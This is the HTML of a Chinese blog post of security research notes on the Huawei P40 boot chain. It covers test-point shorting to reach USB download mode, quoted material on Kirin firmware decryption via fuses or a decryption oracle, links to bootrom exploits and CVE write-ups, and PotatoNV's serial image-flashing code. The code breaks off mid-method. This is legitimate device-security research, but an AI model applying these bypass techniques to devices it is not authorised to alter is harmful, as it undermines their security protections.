<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
    <title>huawei p40研究</title>
    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <header>
        <nav class="site-nav">
            <a href="./index.html" class="nav-link">/home</a>
            <span class="nav-separator">|</span>
            <a href="./about.html" class="nav-link">/about</a>
        </nav>
        <div class="terminal-prompt">
            <span style="color:#666">[</span><span style="color:#fabd2f">ayoung</span><span style="color:#666">@</span><span style="color:#59adeb">lab</span> <span style="color:#83a598"><a href="./index.html" class="path-link">posts</a></span><span style="color:#666">]$</span> 
            <span class="cmd">cat ./huawei p40研究.md</span><span class="cursor">█</span>
        </div>
        <h1 class="post-title">huawei p40研究</h1><div style="color: #666; font-size: 0.8rem; margin-bottom: 20px;">[Last modified: 2025-02-18]</div>
    </header>
    <div class="layout-grid">
                <main><p><a href="https://blog.csdn.net/COCO56/article/details/126978940">安装驱动</a></p>
<p><a href="https://baijiahao.baidu.com/s?id=1717575570653467435">改装工程线</a>
10kΩ电阻 在绿线和红线中间焊锡
<img src="./images/583bf5a431f40df52726198554e87e8.jpg" alt="" /></p>
<p>短接
<img src="./images/Pasted%20image%2020241128220839.png" alt="" /></p>
<p>短接后接电脑
<img src="./images/Pasted%20image%2020241107195317.png" alt="" /></p>
<p>下载bootloader解密固件：https://androidfilehost.com/?fid=17825722713688247681</p>
<p>三大研究团队：
https://labs.taszk.io/
https://blog.impalabs.com/
pangu（盘古）</p>
<p>固件解密：</p>
<blockquote>
<p>Once we have control over the Bootrom, the decryption method depends on the chipset version.  For older versions, the encryption key can be extracted directly from the fuses, while on newer chipsets, the device must be used as a decryption oracle.  In both cases, we end up with cleartext binaries ready to be analyzed.</p>
</blockquote>
<blockquote>
<p>一旦我们控制了Bootrom，解密方法就取决于芯片组的版本。对于较旧的版本，可以直接从熔丝中提取加密密钥，而在较新的芯片组上，则需要将设备用作解密的工具。在这两种情况下，我们最终都会得到可供分析的明文二进制文件。</p>
</blockquote>
<blockquote>
<p>Finally, some firmware images (depending on device type) are encrypted using
AES CTR mode. The symmetric key used for this is stored in the device itself.
When the security header of the firmware to be loaded indicates that the image
is encrypted, the bootloader directs the hardware-based crypto engine to decrypt
the image with the stored AES key.
In the case of older Kirin devices (e.g. 710 series), the AES key was still stored
in a fuse directly accessible from the early stages of the bootloader. In the case of
the Kirin 980 series and newer, the AES key is only directly accessible by the crypto
engine that behaves as a decryption oracle for the bootloader stages.</p>
</blockquote>
<blockquote>
<p>最后，一些固件映像（取决于设备类型）使用AES CTR模式加密。用于此操作的对称密钥存储在设备本身中。当要加载的固件的安全标头表明映像已加密时，引导加载程序指示基于硬件的加密引擎进行解密使用存储的AES密钥生成图像。
在较旧的麒麟设备（例如710系列）中，AES密钥仍然存储在引信中，可以从引导加载程序的早期阶段直接访问。在麒麟980系列和更新版本的情况下，AES密钥只能由加密引擎直接访问，加密引擎在引导加载程序阶段充当解密oracle。新的版本中，AES密钥只能由加密引擎直接访问，它的行为就像引导加载程序阶段的解密oracle。</p>
</blockquote>
<p>bootrom应该需要使用编程器从芯片中提取固件
xloader等可从ota中下载</p>
<h2 id="yi-xie-wang-zhi">一些网址</h2><p>刷机包下载：</p>
<ul>
<li>https://firmware.gem-flash.com/index.php?a=downloads&amp;b=folder&amp;id=7386</li>
<li>https://huaweistockrom.com/</li>
</ul>
<p>启动相关文章：</p>
<ul>
<li><a href="https://github.com/mlfnc/android_kernel_huawei_kirin659">android_kernel_huawei_kirin659</a></li>
<li><a href="https://www.youtube.com/watch?v=YkGugQ019ZY">Huawei unlock bootloader | PotatoNV Tool Kirin 960/950/935/925/650-659/620 (READ VIDEO DESCRIPTION)</a></li>
<li><a href="https://xuanxuanblingbling.github.io/trustzone/2023/03/06/huawei/">【TrustZone相关漏洞导读】CVE-2021-39994：HUAWEI SMC SE Factory Check OOB Access</a></li>
<li><a href="https://blog.impalabs.com/2212_huawei-security-hypervisor.html#introduction">Shedding Light on Huawei's Security Hypervisor</a></li>
<li><a href="https://blog.o0xmuhe.xyz/2022/12/31/%E6%9C%80%E8%BF%91%E7%9C%8B%E8%BF%87%E7%9A%84%E8%AE%AE%E9%A2%98-%E6%96%87%E7%AB%A0-Bootloader-TZ/">最近看过的议题&amp;文章(Bootloader/TZ)</a></li>
<li><a href="https://raw.githubusercontent.com/hhj4ck/checkm30/master/checkm30.pdf">checkmate mate30</a></li>
<li><a href="https://www.youtube.com/watch?v=aO-piU9-3k8">checkm30 视频</a></li>
</ul>
<p>kirin710漏洞利用
<a href="https://github.com/map220v/kirin710_bootrom_exploit">GitHub - map220v/kirin710_bootrom_exploit: Tested on Honor 8x</a></p>
<p><a href="https://buaq.net/go-197625.html">二进制漏洞分析-2.​揭示华为安全管理程序(上)</a>
<a href="https://github.com/hicode002/studentpad-hack/blob/main/docs/huawei_iflytek_boot_process.md">studentpad-hack</a></p>
<h2 id="usb-download-mode">usb download mode</h2><h3 id="xmodem-protocol">xmodem protocol</h3><p>回显单字节：</p>
<ul>
<li>0xaa ACK</li>
<li>0x55 NAK</li>
<li>0x07 addr/size错误</li>
</ul>
<p>Head chunk：下载镜像地址和大小
Data chunk：要加载的实际镜像片段，每次最大1024字节增量下载，并附带一个序列计数器
Tail chunk：终止传输，并进入镜像验签阶段
Inquiry chunk：向 bootloader 请求状态值（读取固定地址<code>0x21e04</code>4字节内容）</p>
<p>seq：序列号
<img src="./images/Pasted%20image%2020241208213620.png" alt="" /></p>
<p><img src="./images/Pasted%20image%2020241208224451.png" alt="" /></p>
<h3 id="potatonv">PotatoNV</h3><p>找到一个刷旧版本华为固件的软件 PotatoNV
CommMonitor 串口监控精灵，监控串口流量</p>
<p><img src="./images/Pasted%20image%2020241128224608.png" alt="" /></p>
<h3 id="potatonv-next-xie-yi-shi-xian">potatoNV-next 协议实现</h3><pre style="background-color:#2b303b;">
<span style="color:#b48ead;">public class </span><span style="color:#ebcb8b;">ImageFlasher
</span><span style="color:#eff1f5;">{
</span><span style="color:#eff1f5;">    </span><span style="color:#65737e;">// Fields
</span><span style="color:#eff1f5;">    </span><span style="color:#b48ead;">private const int </span><span style="color:#bf616a;">BAUDRATE </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0x1_c200</span><span style="color:#eff1f5;">;
</span><span style="color:#eff1f5;">    </span><span style="color:#b48ead;">private const int </span><span style="color:#bf616a;">MAX_DATA_LEN </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0x400</span><span style="color:#eff1f5;">;
</span><span style="color:#eff1f5;">    </span><span style="color:#b48ead;">private static readonly byte</span><span style="color:#eff1f5;">[] </span><span style="color:#bf616a;">headframe </span><span style="color:#c0c5ce;">= new </span><span style="color:#b48ead;">byte</span><span style="color:#eff1f5;">[] { </span><span style="color:#d08770;">0xfe</span><span style="color:#eff1f5;">, </span><span style="color:#d08770;">0</span><span style="color:#eff1f5;">, </span><span style="color:#d08770;">0xff</span><span style="color:#eff1f5;">, </span><span style="color:#d08770;">1 </span><span style="color:#eff1f5;">};
</span><span style="color:#eff1f5;">    </span><span style="color:#b48ead;">private static readonly byte</span><span style="color:#eff1f5;">[] </span><span style="color:#bf616a;">dataframe </span><span style="color:#c0c5ce;">= new </span><span style="color:#b48ead;">byte</span><span style="color:#eff1f5;">[] { </span><span style="color:#d08770;">0xda </span><span style="color:#eff1f5;">};
</span><span style="color:#eff1f5;">    </span><span style="color:#b48ead;">private static readonly byte</span><span style="color:#eff1f5;">[] </span><span style="color:#bf616a;">tailframe </span><span style="color:#c0c5ce;">= new </span><span style="color:#b48ead;">byte</span><span style="color:#eff1f5;">[] { </span><span style="color:#d08770;">0xed </span><span style="color:#eff1f5;">};
</span><span style="color:#eff1f5;">    </span><span style="color:#b48ead;">private </span><span style="color:#eff1f5;">SerialPort </span><span style="color:#bf616a;">port</span><span style="color:#eff1f5;">;
</span><span style="color:#eff1f5;">
</span><span style="color:#eff1f5;">    </span><span style="color:#65737e;">// Methods
</span><span style="color:#eff1f5;">    </span><span style="color:#b48ead;">public void </span><span style="color:#8fa1b3;">Close</span><span style="color:#eff1f5;">()
</span><span style="color:#eff1f5;">    {
</span><span style="color:#eff1f5;">        </span><span style="color:#bf616a;">this</span><span style="color:#eff1f5;">.</span><span style="color:#bf616a;">port</span><span style="color:#eff1f5;">.</span><span style="color:#8fa1b3;">Close</span><span style="color:#eff1f5;">();
</span><span style="color:#eff1f5;">        </span><span style="color:#bf616a;">this</span><span style="color:#eff1f5;">.</span><span style="color:#bf616a;">port</span><span style="color:#eff1f5;">.</span><span style="color:#8fa1b3;">Dispose</span><span style="color:#eff1f5;">();
</span><span style="color:#eff1f5;">        </span><span style="color:#bf616a;">this</span><span style="color:#eff1f5;">.</span><span style="color:#bf616a;">port </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">null</span><span style="color:#eff1f5;">;
</span><span style="color:#eff1f5;">    }
</span><span style="color:#eff1f5;">
</span><span style="color:#eff1f5;">    </span><span style="color:#b48ead;">public void </span><span style="color:#8fa1b3;">Open</span><span style="color:#eff1f5;">(</span><span style="color:#b48ead;">string </span><span style="color:#bf616a;">portName</span><span style="color:#eff1f5;">)
</span><span style="color:#eff1f5;">    {
</span><span style="color:#eff1f5;">        SerialPort </span><span style="color:#bf616a;">port1 </span><span style="color:#c0c5ce;">= new </span><span style="color:#eff1f5;">SerialPort();
</span><span style="color:#eff1f5;">        </span><span style="color:#bf616a;">port1</span><span style="color:#eff1f5;">.</span><span style="color:#bf616a;">PortName </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">portName</span><span style="color:#eff1f5;">;
</span><span style="color:#eff1f5;">        </span><span style="color:#bf616a;">port1</span><span style="color:#eff1f5;">.</span><span style="color:#bf616a;">BaudRate </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0x1_c200</span><span style="color:#eff1f5;">;
</span><span style="color:#eff1f5;">        </span><span style="color:#bf616a;">port1</span><span style="color:#eff1f5;">.</span><span style="color:#bf616a;">DtrEnable </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">true</span><span style="color:#eff1f5;">;
</span><span style="color:#eff1f5;">        </span><span style="color:#bf616a;">port1</span><span style="color:#eff1f5;">.</span><span style="color:#bf616a;">RtsEnable </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">true</span><span style="color:#eff1f5;">;
</span><span style="color:#eff1f5;">        </span><span style="color:#bf616a;">port1</span><span style="color:#eff1f5;">.</span><span style="color:#bf616a;">ReadTimeout </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0x3e8</span><span style="color:#eff1f5;">;
</span><span style="color:#eff1f5;">        </span><span style="color:#bf616a;">port1</span><span style="color:#eff1f5;">.</span><span style="color:#bf616a;">WriteTimeout </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0x3e8</span><span style="color:#eff1f5;">;
</span><span style="color:#eff1f5;">        </span><span style="color:#bf616a;">this</span><span style="color:#eff1f5;">.</span><span style="color:#bf616a;">port </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">port1</span><span style="color:#eff1f5;">;
</span><span style="color:#eff1f5;">        </span><span style="color:#bf616a;">this</span><span style="color:#eff1f5;">.</span><span style="color:#bf616a;">port</span><span style="color:#eff1f5;">.</span><span style="color:#8fa1b3;">Open</span><span style="color:#eff1f5;">();
</span><span style="color:#eff1f5;">    }
</span><span style="color:#eff1f5;">
</span><span style="color:#eff1f5;">    </span><span style="color:#b48ead;">private void </span><span style="color:#8fa1b3;">SendDataFrame</span><span style="color:#eff1f5;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">n</span><span style="color:#eff1f5;">, </span><span style="color:#b48ead;">byte</span><span style="color:#eff1f5;">[] </span><span style="color:#bf616a;">data</span><span style="color:#eff1f5;">)
</span><span style="color:#eff1f5;">    {
</span><span style="color:#eff1f5;">        List&lt;</span><span style="color:#b48ead;">byte</span><span style="color:#eff1f5;">&gt; </span><span style="color:#bf616a;">list1 </span><span style="color:#c0c5ce;">= new </span><span style="color:#eff1f5;">List&lt;</span><span style="color:#b48ead;">byte</span><span style="color:#eff1f5;">&gt;(</span><span style="color:#bf616a;">dataframe</span><span style="color:#eff1f5;">);
</span><span style="color:#eff1f5;">        </span><span style="color:#bf616a;">list1</span><span style="color:#eff1f5;">.</span><span style="color:#8fa1b3;">Add</span><span style="color:#eff1f5;">((</span><span style="color:#b48ead;">byte</span><span style="color:#eff1f5;">) (</span><span style="color:#bf616a;">n </span><span style="color:#c0c5ce;">&amp; </span><span style="color:#d08770;">0xff</span><span style="color:#eff1f5;">));
</span><span style="color:#eff1f5;">        </span><span style="color:#bf616a;">list1</span><span style="color:#eff1f5;">.</span><span style="color:#8fa1b3;">Add</span><span style="color:#eff1f5;">((</span><span style="color:#b48ead;">byte</span><span style="color:#eff1f5;">) (</span><span style="color:#c0c5ce;">~</span><span style="color:#bf616a;">n </span><span style="color:#c0c5ce;">&amp; </span><span style="color:#d08770;">0xff</span><span style="color:#eff1f5;">));
</span><span style="color:#eff1f5;">        List&lt;</span><span style="color:#b48ead;">byte</span><span style="color:#eff1f5;">&gt; </span><span style="color:#bf616a;">list </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">list1</span><span style="color:#eff1f5;">;
</span><span style="color:#eff1f5;">        </span><span style="color:#bf616a;">list</span><span style="color:#eff1f5;">.</span><span style="color:#8fa1b3;">AddRange</span><span style="color:#eff1f5;">(</span><span style="color:#bf616a;">data</span><span style="color:#eff1f5;">);
</span><span style="color:#eff1f5;">        </span><span style="color:#bf616a;">this</span><span style="color:#eff1f5;">.</span><span style="color:#8fa1b3;">SendFrame</span><span style="color:#eff1f5;">(</span><span style="color:#bf616a;">list</span><span style="color:#eff1f5;">.</span><span style="color:#8fa1b3;">ToArray</span><span style="color:#eff1f5;">());
</span><span style="color:#eff1f5;">    }
</span><span style="color:#eff1f5;">
</span><span style="color:#eff1f5;">    </span><span style="color:#b48ead;">private void </span><span style="color:#8fa1b3;">SendFrame</span><span style="color:#eff1f5;">(</span><span style="color:#b48ead;">byte</span><span style="color:#eff1f5;">[] </span><span style="color:#bf616a;">data</span><span style="color:#eff1f5;">)
</span><span style="color:#eff1f5;">    {
</span><span style="color:#eff1f5;">        </span><span style="color:#b48ead;">ushort </span><span style="color:#bf616a;">checksum </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">CRC</span><span style="color:#eff1f5;">.</span><span style="color:#8fa1b3;">GetChecksum</span><span style="color:#eff1f5;">(</span><span style="color:#bf616a;">data</span><span style="color:#eff1f5;">);
</span><span style="color:#eff1f5;">        List&lt;</span><span style="color:#b48ead;">byte</span><span style="color:#eff1f5;">&gt; </span><span style="color:#bf616a;">source </span><span style="color:#c0c5ce;">= new </span><span style="color:#eff1f5;">List&lt;</span><span style="color:#b48ead;">byte</span><span style="color:#eff1f5;">&gt;(</span><span style="color:#bf616a;">data</span><span style="color:#eff1f5;">);
</span><span style="color:#eff1f5;">        </span><span style="color:#bf616a;">source</span><span style="color:#eff1f5;">.</span><span style="color:#8fa1b3;">Add</span><span style="color:#eff1f5;">((</span><span style="color:#b48ead;">byte</span><span style="color:#eff1f5;">) ((</span><span style="color:#bf616a;">checksum </span><span style="color:#c0c5ce;">&gt;&gt; </span><span style="color:#d08770;">8</span><span style="color:#eff1f5;">) </span><span style="color:#c0c5ce;">&amp; </span><span style="color:#d08770;">0xff</span><span style="color:#eff1f5;">));
</span><span style="color:#eff1f5;">        </span><span style="color:#bf616a;">source</span><span style="color:#eff1f5;">.</span><span style="color:#8fa1b3;">Add</span><span style="color:#eff1f5;">((</span><span style="color:#b48ead;">byte</span><span style="color:#eff1f5;">) (</span><span style="color:#bf616a;">checksum </span><span style="color:#c0c5ce;">&amp; </span><span style="color:#d08770;">0xff</span><span style="color:#eff1f5;">));
</span><span style="color:#eff1f5;">        </span><span style="color:#b48ead;">byte</span><span style="color:#eff1f5;">[] </span><span style="color:#bf616a;">buffer </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">source</span><span style="color:#eff1f5;">.</span><span style="color:#8fa1b3;">ToArray</span><span style="color:#eff1f5;">();
</span><span style="color:#eff1f5;">        </span><span style="color:#bf616a;">this</span><span style="color:#eff1f5;">.</span><span style="color:#bf616a;">port</span><span style="color:#eff1f5;">.</span><span style="color:#8fa1b3;">Write</span><span style="color:#eff1f5;">(</span><span style="color:#bf616a;">buffer</span><span style="color:#eff1f5;">, </span><span style="color:#d08770;">0</span><span style="color:#eff1f5;">, </span><span style="color:#bf616a;">source</span><span style="color:#eff1f5;">.</span><span style="color:#8fa1b3;">Count</span><span style="color:#eff1f5;">&lt;</span><span style="color:#b48ead;">byte</span><span style="color:#eff1f5;">&gt;());
</span><span style="color:#eff1f5;">        </span><span style="color:#b48ead;">byte </span><span style="color:#bf616a;">num3 </span><span style="color:#c0c5ce;">= </span><span style="color:#eff1f5;">(</span><span style="color:#b48ead;">byte</span><span style="color:#eff1f5;">) </span><span style="color:#bf616a;">this</span><span style="color:#eff1f5;">.</span><span style="color:#bf616a;">port</span><span style="color:#eff1f5;">.</span><span style="color:#8fa1b3;">ReadByte</span><span style="color:#eff1f5;">();
</span><span style="color:#eff1f5;">        </span><span style="color:#bf616a;">this</span><span style="color:#eff1f5;">.</span><span style="color:#bf616a;">port</span><span style="color:#eff1f5;">.</span><span style="color:#8fa1b3;">DiscardInBuffer</span><span style="color:#eff1f5;">();
</span><span style="color:#eff1f5;">        </span><span style="color:#bf616a;">this</span><span style="color:#eff1f5;">.</span><span style="color:#bf616a;">port</span><span style="color:#eff1f5;">.</span><span style="color:#8fa1b3;">DiscardOutBuffer</span><span style="color:#eff1f5;">();
</span><span style="color:#eff1f5;">        </span><span style="color:#b48ead;">if </span><span style="color:#eff1f5;">(</span><span style="color:#bf616a;">num3 </span><span style="color:#c0c5ce;">!= </span><span style="color:#d08770;">170</span><span style="color:#eff1f5;">)
</span><span style="color:#eff1f5;">        {
</span><span style="color:#eff1f5;">            </span><span style="color:#b48ead;">throw </span><span style="color:#c0c5ce;">new </span><span style="color:#eff1f5;">Exception(</span><span style="color:#c0c5ce;">$&quot;</span><span style="color:#a3be8c;">ACK is invalid! ACK=</span><span style="color:#eff1f5;">{</span><span style="color:#bf616a;">num3</span><span style="color:#d08770;">:X2</span><span style="color:#eff1f5;">}</span><span style="color:#a3be8c;">; Excepted=</span><span style="color:#eff1f5;">{</span><span style="color:#d08770;">170:X2</span><span style="color:#eff1f5;">}</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#eff1f5;">);
</span><span style="color:#eff1f5;">        }
</span><span style="color:#eff1f5;">    }
</span><span style="color:#eff1f5;">
</span><span style="color:#eff1f5;">    </span><span style="color:#b48ead;">private void </span><span style="color:#8fa1b3;">SendHeadFrame</span><span style="color:#eff1f5;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">length</span><span style="color:#eff1f5;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">address</span><span style="color:#eff1f5;">)
</span><span style="color:#eff1f5;">    {
</span><span style="color:#eff1f5;">        List&lt;</span><span style="color:#b48ead;">byte</span><span style="color:#eff1f5;">&gt; </span><span style="color:#bf616a;">list </span><span style="color:#c0c5ce;">= new </span><span style="color:#eff1f5;">List&lt;</span><span style="color:#b48ead;">byte</span><span style="color:#eff1f5;">&gt;(</span><span style="color:#bf616a;">headframe</span><span style="color:#eff1f5;">);
</span><span style="color:#eff1f5;">        </span><span style="color:#bf616a;">list</span><span style="color:#eff1f5;">.</span><span style="color:#8fa1b3;">AddRange</span><span style="color:#eff1f5;">(</span><span style="color:#bf616a;">BitConverter</span><span style="color:#eff1f5;">.</span><span style="color:#8fa1b3;">GetBytes</span><span style="color:#eff1f5;">(</span><span style="color:#bf616a;">length</span><span style="color:#eff1f5;">).</span><span style="color:#8fa1b3;">Reverse</span><span style="color:#eff1f5;">&lt;</span><span style="color:#b48ead;">byte</span><span style="color:#eff1f5;">&gt;());
</span><span style="color:#eff1f5;">        </span><span style="color:#bf616a;">list</span><span style="color:#eff1f5;">.</span><span style="color:#8fa1b3;">AddRange</span><span style="color:#eff1f5;">(</span><span style="color:#bf616a;">BitConverter</span><span style="color:#eff1f5;">.</span><span style="color:#8fa1b3;">GetBytes</span><span style="color:#eff1f5;">(</span><span style="color:#bf616a;">address</span><span style="color:#eff1f5;">).</span><span style="color:#8fa1b3;">Reverse</span><span style="color:#eff1f5;">&lt;</span><span style="color:#b48ead;">byte</span><span style="color:#eff1f5;">&gt;());
</span><span style="color:#eff1f5;">        </span><span style="color:#bf616a;">this</span><span style="color:#eff1f5;">.</span><span style="color:#8fa1b3;">SendFrame</span><span style="color:#eff1f5;">(</span><span style="color:#bf616a;">list</span><span style="color:#eff1f5;">.</span><span style="color:#8fa1b3;">ToArray</span><span style="color:#eff1f5;">());
</span><span style="color:#eff1f5;">    }
</span><span style="color:#eff1f5;">
</span><span style="color:#eff1f5;">    </span><span style="color:#b48ead;">private void </span><span style="color:#8fa1b3;">SendTailFrame</span><span style="color:#eff1f5;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">n</span><span style="color:#eff1f5;">)
</span><span style="color:#eff1f5;">    {
</span><span style="color:#eff1f5;">        List&lt;</span><span style="color:#b48ead;">byte</span><span style="color:#eff1f5;">&gt; </span><span style="color:#bf616a;">list1 </span><span style="color:#c0c5ce;">= new </span><span style="color:#eff1f5;">List&lt;</span><span style="color:#b48ead;">byte</span><span style="color:#eff1f5;">&gt;(</span><span style="color:#bf616a;">tailframe</span><span style="color:#eff1f5;">);
</span><span style="color:#eff1f5;">        </span><span style="color:#bf616a;">list1</span><span style="color:#eff1f5;">.</span><span style="color:#8fa1b3;">Add</span><span style="color:#eff1f5;">((</span><span style="color:#b48ead;">byte</span><span style="color:#eff1f5;">) (</span><span style="color:#bf616a;">n </span><span style="color:#c0c5ce;">&amp; </span><span style="color:#d08770;">0xff</span><span style="color:#eff1f5;">));
</span><span style="color:#eff1f5;">        </span><span style="color:#bf616a;">list1</span><span style="color:#eff1f5;">.</span><span style="color:#8fa1b3;">Add</span><span style="color:#eff1f5;">((</span><span style="color:#b48ead;">byte</span><span style="color:#eff1f5;">) (</span><span style="color:#c0c5ce;">~</span><span style="color:#bf616a;">n </span><span style="color:#c0c5ce;">&amp; </span><span style="color:#d08770;">0xff</span><span style="color:#eff1f5;">));
</span><span style="color:#eff1f5;">        </span><span style="color:#bf616a;">this</span><span style="color:#eff1f5;">.</span><span style="color:#8fa1b3;">SendFrame</span><span style="color:#eff1f5;">(</span><span style="color:#bf616a;">list1</span><span style="color:#eff1f5;">.</span><span style="color:#8fa1b3;">ToArray</span><span style="color:#eff1f5;">());
</span><span style="color:#eff1f5;">    }
</span><span style="color:#eff1f5;">
</span><span style="color:#eff1f5;">    </span><span style="color:#b48ead;">public void </span><span style="color:#8fa1b3;">Write</span><span style="color:#eff1f5;">(</span><span style="color:#b48ead;">string </span><span style="color:#bf616a;">path</span><span style="color:#eff1f5;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">address</span><span style="color:#eff1f5;">, Action&lt;</span><span style="color:#b48ead;">int</span><span style="color:#eff1f5;">&gt; </span><span style="color:#bf616a;">reportProgress </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">null</span><span style="color:#eff1f5;">)
</span><span style="color:#eff1f5;">    {
</span><span style="color:#eff1f5;">        FileStream </span><span style="color:#bf616a;">stream </span><span style="color:#c0c5ce;">= new </span><span style="color:#eff1f5;">FileStream(</span><span style="color:#bf616a;">path</span><span style="color:#eff1f5;">, </span><span style="color:#bf616a;">FileMode</span><span style="color:#eff1f5;">.</span><span style="color:#bf616a;">Open</span><span style="color:#eff1f5;">, </span><span style="color:#bf616a;">FileAccess</span><span style="color:#eff1f5;">.</span><span style="color:#bf616a;">Read</span><span style="color:#eff1f5;">);
</span><span style="color:#eff1f5;">        </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">length </span><span style="color:#c0c5ce;">= </span><span style="color:#eff1f5;">(</span><span style="color:#b48ead;">int</span><span style="color:#eff1f5;">) </span><span style="color:#bf616a;">stream</span><span style="color:#eff1f5;">.</span><span style="color:#bf616a;">Length</span><span style="color:#eff1f5;">;
</span><span style="color:#eff1f5;">        </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">num2 </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">length </span><span style="color:#c0c5ce;">/ </span><span style="color:#eff1f5;">(</span><span style="color:#d08770;">0x400 </span><span style="color:#c0c5ce;">+ </span><span style="color:#eff1f5;">(((</span><span style="color:#bf616a;">length </span><span style="color:#c0c5ce;">% </span><span style="color:#d08770;">0x400</span><span style="color:#eff1f5;">) </span><span style="color:#c0c5ce;">&gt; </span><span style="color:#d08770;">0</span><span style="color:#eff1f5;">) </span><span style="color:#c0c5ce;">? </span><span style="color:#d08770;">1 </span><span style="color:#c0c5ce;">: </span><span style="color:#d08770;">0</span><span style="color:#eff1f5;">));
</span><span style="color:#eff1f5;">        </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">num3 </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#eff1f5;">;
</span><span style="color:#eff1f5;">        </span><span style="color:#b48ead;">byte</span><span style="color:#eff1f5;">[] </span><span style="color:#bf616a;">buffer </span><span style="color:#c0c5ce;">= new </span><span style="color:#b48ead;">byte</span><span style="color:#eff1f5;">[</span><span style="color:#d08770;">0x400</span><span style="color:#eff1f5;">];
</span><span style="color:#eff1f5;">        </span><span style="color:#bf616a;">this</span><span style="color:#eff1f5;">.</span><span style="color:#8fa1b3;">SendHeadFrame</span><span style="color:#eff1f5;">(</span><span style="color:#bf616a;">length</span><span style="color:#eff1f5;">, </span><span style="color:#bf616a;">address</span><span style="color:#eff1f5;">);
</span><span style="color:#eff1f5;">        </span><span style="color:#b48ead;">while </span><span style="color:#eff1f5;">(</span><span style="color:#bf616a;">length </span><span style="color:#c0c5ce;">&gt; </span><span style="color:#d08770;">0x400</span><span style="color:#eff1f5;">)
</span><span style="color:#eff1f5;">        {
</span><span style="color:#eff1f5;">            </span><span style="color:#bf616a;">stream</span><span style="color:#eff1f5;">.</span><span style="color:#8fa1b3;">Read</span><span style="color:#eff1f5;">(</span><span style="color:#bf616a;">buffer</span><span style="color:#eff1f5;">, </span><span style="color:#d08770;">0</span><span style="color:#eff1f5;">, </span><span style="color:#d08770;">0x400</span><span style="color:#eff1f5;">);
</span><span style="color:#eff1f5;">            </span><span style="color:#bf616a;">this</span><span style="color:#eff1f5;">.</span><span style="color:#8fa1b3;">SendDataFrame</span><span style="color:#eff1f5;">(</span><span style="color:#bf616a;">num3 </span><span style="color:#c0c5ce;">+ </span><span style="color:#d08770;">1</span><span style="color:#eff1f5;">, </span><span style="color:#bf616a;">buffer</span><span style="color:#eff1f5;">);
</span><span style="color:#eff1f5;">            </span><span style="color:#bf616a;">num3</span><span style="color:#c0c5ce;">++</span><span style="color:#eff1f5;">;
</span><span style="color:#eff1f5;">            </span><span style="color:#bf616a;">length </span><span style="color:#c0c5ce;">-= </span><span style="color:#d08770;">0x400</span><span style="color:#eff1f5;">;
</span><span style="color:#eff1f5;">            </span><span style="color:#b48ead;">if </span><span style="color:#eff1f5;">(((</span><span style="color:#bf616a;">num3 </span><span style="color:#c0c5ce;">% </span><span style="color:#eff1f5;">((</span><span style="color:#bf616a;">num2 </span><span style="color:#c0c5ce;">&gt; </span><span style="color:#d08770;">250</span><span style="color:#eff1f5;">) </span><span style="color:#c0c5ce;">? </span><span style="color:#d08770;">10 </span><span style="color:#c0c5ce;">: </span><span style="color:#d08770;">3</span><span style="color:#eff1f5;">)) </span><span style="color:#c0c5ce;">== </span><span style="color:#d08770;">0</span><span style="color:#eff1f5;">) </span><span style="color:#c0c5ce;">&amp;&amp; </span><span style="color:#eff1f5;">(</span><span style="color:#bf616a;">reportProgress </span><span style="color:#c0c5ce;">!= </span><span style="color:#d08770;">null</span><span style="color:#eff1f5;">))
</span><span style="color:#eff1f5;">            {
</span><span style="color:#eff1f5;">                </span><span style="color:#8fa1b3;">reportProgress</span><span style="color:#eff1f5;">((</span><span style="color:#b48ead;">int</span><span style="color:#eff1f5;">) ((</span><span style="color:#d08770;">100</span><span style="color:#b48ead;">f </span><span style="color:#c0c5ce;">* </span><span style="color:#bf616a;">num3</span><span style="color:#eff1f5;">) </span><span style="color:#c0c5ce;">/ </span><span style="color:#eff1f5;">((</span><span style="color:#b48ead;">float</span><span style="color:#eff1f5;">) </span><span style="color:#bf616a;">num2</span><span style="color:#eff1f5;">)));
</span><span style="color:#eff1f5;">            }
</span><span style="color:#eff1f5;">        }
</span><span style="color:#eff1f5;">        </span><span style="color:#b48ead;">if </span><span style="color:#eff1f5;">(</span><span style="color:#bf616a;">length </span><span style="color:#c0c5ce;">&gt; </span><span style="color:#d08770;">0</span><span style="color:#eff1f5;">)
</span><span style="color:#eff1f5;">        {
</span><span style="color:#eff1f5;">            </span><span style="color:#bf616a;">buffer </span><span style="color:#c0c5ce;">= new </span><span style="color:#b48ead;">byte</span><span style="color:#eff1f5;">[</span><span style="color:#bf616a;">length</span><span style="color:#eff1f5;">];
